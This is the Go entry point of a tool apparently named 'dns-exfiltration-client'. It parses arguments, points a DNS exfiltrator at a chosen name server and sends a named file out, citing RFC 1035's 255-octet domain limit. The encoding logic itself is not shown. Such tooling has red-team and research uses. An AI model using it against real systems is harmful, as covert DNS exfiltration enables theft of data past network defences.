package main

import (
	"dns-exfiltration-client/exfiltrator"
	"dns-exfiltration-client/parser"
)

const (
	// To simplify implementations, the total length of a domain name (i.e.,
	// label octets and label length octets) is restricted to 255 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	MAX_DOMAIN_NAME_LENGTH = 255
)

func main() {
	args := parser.ParseArgs()
	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer)
	dnsExfiltrator.ExfiltrateFile(args.Filename)
}
